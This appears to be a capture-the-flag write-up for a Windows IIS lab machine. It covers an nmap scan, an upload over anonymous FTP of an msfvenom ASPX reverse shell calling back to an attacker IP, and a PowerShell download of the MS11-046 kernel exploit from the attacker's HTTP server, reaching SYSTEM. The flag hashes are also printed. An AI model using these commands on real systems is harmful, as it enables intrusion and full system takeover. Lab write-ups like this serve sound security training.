### [SCAN]
    21/tcp open  ftp     syn-ack Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | 03-18-17  01:06AM       <DIR>          aspnet_client
    | 03-17-17  04:37PM                  689 iisstart.htm
    |_03-17-17  04:37PM               184946 welcome.png
    | ftp-syst: 
    |_  SYST: Windows_NT
    80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
    | http-methods: 
    |   Supported Methods: OPTIONS TRACE GET HEAD POST
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: IIS7
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
### [ANALYSIS]
    Some sort of ftp exploit, anonymous login is allowed. Assuming it will be a IIS/upload file exploit 
    we can hand craft with msfvenom or use metasploit module

### [EXPLOIT]
    msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.19 LPORT=2222 -o shell.aspx
    #connect to ftp
    put shell.aspx
    #go to website 10.10.10.5/shell.aspx(with nc listener up nc -nlvp 2222) and catch a shell
    #proof of exploit 
    c:\windows\system32\inetsrv>whoami
    whoami
    iis apppool\web (Service account aquired]

### [ANALYSIS]
    Attempt to get to C:\users\babis but access is denied, some sort of priv esc is going to be needed.
    systeminfo shows windows 7 machine, lets look at some exploits.
    Going to use secWiki's windows exploits for this one
    MS11-046

### [PRIV ESC]
    spear㉿Hades)-[~/windows-kernel-exploits/MS11-046]
    └─$ python -m SimpleHTTPServer     
    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.19:8000/ms11-046.exe', 'c:\Users\Public\Downloads\ms11-046.exe')"
    C:\Users\Public\Downloads
    ms11-046.exe

    c:\Windows\System32>whoami
    whoami
    nt authority\system
   It Worked!!

**#Note if shell drops at any time go refresh the shell on website

### [HASH]
    9ecdd6a3aedf24b41562fea70f4cb3e8 C:\users\babis\desktop\user.txt.txt
    e621a0b5041708797c4fc4728bc72b4b C:\users\administrator\desktop\root.txt
